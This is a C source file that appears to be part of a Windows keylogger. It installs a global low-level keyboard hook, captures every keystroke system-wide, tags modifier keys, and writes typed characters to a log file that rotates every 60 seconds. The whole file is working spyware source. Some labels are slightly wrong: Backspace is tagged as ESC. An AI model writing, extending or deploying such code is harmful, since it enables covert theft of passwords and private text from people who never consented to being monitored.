#include "Keylogger.h"

time_t start, end;
#define NEW_FILE_NUM_SECONDS 60 
static LPCWSTR current_filename;

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	static int last;
	BOOL letter = 1;

	wchar_t currentKey[10];
	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			int code = p->vkCode;
			if (code == 0xA2)
			{ // LCTRL or first signal of RALT
				last = code;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			if (last == 0xA2 && code == 0xA5)
			{ // RALT
				printf("%s", "<RALT>");
				letter = 0;
			}
			else if (last == 0xA2 && code != 0xA5)
			{
				printf("%s", "<LCTRL>");
			}
			if (code == 0xA3)
			{
				letter = 0;
				printf("%s", "<RCTRL>");
			}
			if (code == 0xA4)
			{
				letter = 0;
				printf("%s", "<LALT>");
			}
			if (code == 0xA0)
			{
				letter = 0;
				printf("%s", "<LSHIFT>");
			}
			if (code == 0xA1)
			{
				letter = 0;
				printf("%s", "<RSHIFT>");
			}
			if (code == 0x08)
			{
				letter = 0;
				printf("%s", "<ESC>");
			}
			if (code == 0x0D)
			{
				letter = 0;
				printf("\n");
			}
			last = code;
			if (letter)
			{
				wchar_t buffer[2];
				buffer[0] = code;
				buffer[1] = '\0';
				writeToFile(buffer, current_filename);
			}  
		}
	}
	time(&end);
	if (difftime(end, start) >= NEW_FILE_NUM_SECONDS)
		PostQuitMessage(0);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD keylogger(LPCWSTR filename)
{
	time(&start);
	time(&end);
	current_filename = filename;

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, 0, 0)) // pulls the message from the queue and fills in the MSG structure
	{
		// translates keystrokes (key down, key up) into characters
		TranslateMessage(&msg);
		if (difftime(end, start) >= NEW_FILE_NUM_SECONDS)
		{
			UnhookWindowsHookEx(hook);
			break;
		}
		// tells the operating system to call the window procedure of 
		// the window that is the target of the message
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
	return 0;
}

